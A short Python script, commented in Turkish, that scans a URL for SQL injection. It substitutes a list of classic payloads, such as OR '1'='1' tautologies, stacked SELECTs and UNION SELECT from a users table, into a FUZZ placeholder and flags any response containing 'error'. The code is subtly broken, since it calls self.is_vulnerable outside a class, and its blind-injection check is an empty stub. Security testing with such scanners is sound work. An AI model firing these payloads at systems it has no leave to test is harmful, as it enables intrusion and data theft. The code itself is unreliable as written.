import requests

def check_sql_injection(url):
    payloads = [
        "'",
        "1' OR '1'='1",
        "1' OR '1'='1' --",
        '"',
        '1" OR "1"="1',
        '1" OR "1"="1" --',
        '")',
        '") OR ("1"="1',
        '") OR ("1"="1" --',
        "')",
        "') OR ('1'='1",
        "') OR ('1'='1' --",
        "';",
        '";',
        '"; SELECT * FROM users; --',
        "'; SELECT * FROM users; --",
        "') UNION SELECT * FROM users; --",
        '") UNION SELECT * FROM users; --',
    ]

    vulnerabilities = []

    for payload in payloads:
        modified_url = url.replace("FUZZ", payload)
        response = requests.get(modified_url)

        if self.is_vulnerable(response):
            vulnerabilities.append(f"Potansiyel SQL Injection açığı bulundu: {modified_url}")

    return vulnerabilities

def is_vulnerable(response):
    # Error-Based SQL Injection kontrolü
    if "error" in response.text.lower():
        return True

    # Blind-Based SQL Injection kontrolü
    # Burada, belirli bir mantıkla yanıtları analiz edebilirsiniz
    # Örneğin, zaman gecikmeleri, beklenmeyen sonuçlar veya hata mesajlarına bakabilirsiniz

    return False
